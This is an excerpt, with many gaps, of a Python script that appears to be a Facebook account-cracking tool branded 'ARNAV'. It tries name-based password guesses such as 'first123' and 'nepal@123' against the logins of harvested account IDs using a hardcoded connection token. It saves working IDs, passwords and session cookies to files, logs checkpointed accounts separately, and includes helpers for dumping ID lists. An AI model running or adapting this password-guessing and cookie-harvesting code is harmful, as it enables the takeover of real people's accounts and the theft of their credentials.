...
try:
    ...
    os.system('xdg-open https://m.facebook.com/messages/t/100051490749533/')
...
logo =   """            
       ...
       NNNNNNNN        NNNNNNNN  iiii hhhhhhh                               lllllll 
       N:::::::N       N::::::N i::::ih:::::h                               l:::::l 
       N::::::::N      N::::::N  iiii h:::::h                               l:::::l 
       N:::::::::N     N::::::N       h:::::h                               l:::::l 
       N::::::::::N    N::::::Niiiiiii h::::h hhhhh         aaaaaaaaaaaaa    l::::l 
       N:::::::::::N   N::::::Ni:::::i h::::hh:::::hhh      a::::::::::::a   l::::l 
       N:::::::N::::N  N::::::N i::::i h::::::::::::::hh    aaaaaaaaa:::::a  l::::l 
       N::::::N N::::N N::::::N i::::i h:::::::hhh::::::h            a::::a  l::::l 
       N::::::N  N::::N:::::::N i::::i h::::::h   h::::::h    aaaaaaa:::::a  l::::l 
       N::::::N   N:::::::::::N i::::i h:::::h     h:::::h  aa::::::::::::a  l::::l 
       N::::::N    N::::::::::N i::::i h:::::h     h:::::h a::::aaaa::::::a  l::::l 
       N::::::N     N:::::::::N i::::i h:::::h     h:::::ha::::a    a:::::a  l::::l 
       N::::::N      N::::::::Ni::::::ih:::::h     h:::::ha::::a    a:::::a l::::::l
       N::::::N       N:::::::Ni::::::ih:::::h     h:::::ha:::::aaaa::::::a l::::::l
       N::::::N        N::::::Ni::::::ih:::::h     h:::::h a::::::::::aa:::al::::::l
       NNNNNNNN         NNNNNNNiiiiiiiihhhhhhh     hhhhhhh  aaaaaaaaaa  aaaallllllll
...
def sarfraz():   
    os.system('clear')
    print(logo)
    print(f'\033[1;37m[1] File Crack   [14 F1R3🔥]') 
    print(f'[2] Public ID Crack    [sorry not available 😕]')
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ARNAV❤️‍🩹] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [ARNAV❤️‍🩹-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ARNAV❤️‍🩹_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/ARNAV❤️‍🩹_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [ARNAV🖤-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/ARNAV❤️‍🩹_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ARNAV❤️‍🩹] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [ARNAV❤️‍🩹-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ARNAV❤️‍🩹_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/ARNAV❤️‍🩹_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     # print(f"\r{A} [ARNAV🖤-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ARNAV❤️‍🩹] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[ARNAV❤️‍🩹] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [ARNAV❤️‍🩹-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ARNAV❤️‍🩹_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            os.system("clear")
            print(logo)
            print(f'{S} [Example: first111 , First@12 , first321 , firstlast , Last@ , firstlast12 , last@123 , firstlast12345 , First@123 , First last , nepal123 , nepal12345 , nepal@123 , first12 , first123 , first1234 , first12345 , last12 , last12345 , Kathmandu ||TO79L 20||]')
            print('')
            if sl =='':
            ...
            print(f"\b{A}U53 A3ROPL9N3 MOD3 94D 59Y 9R59V🖤 {S}")
            print(47*"-")
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/ARNAV❤️‍🩹.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/ARNAV❤️‍🩹.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    print(47*'-')
    input(f"{S} Press Enter To Back ARNAV❤️‍🩹 Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/ARNAV.txt\n') 
        filepath = input("Put File Name: ")
        ...
        print(f"File Saved To  {filepath} ")
        print(47*'-')
        input("Press enter to back ARNAV Menu ")
        SSB(allkey)
    except Exception as e:
        print("Error : %s"%e) 
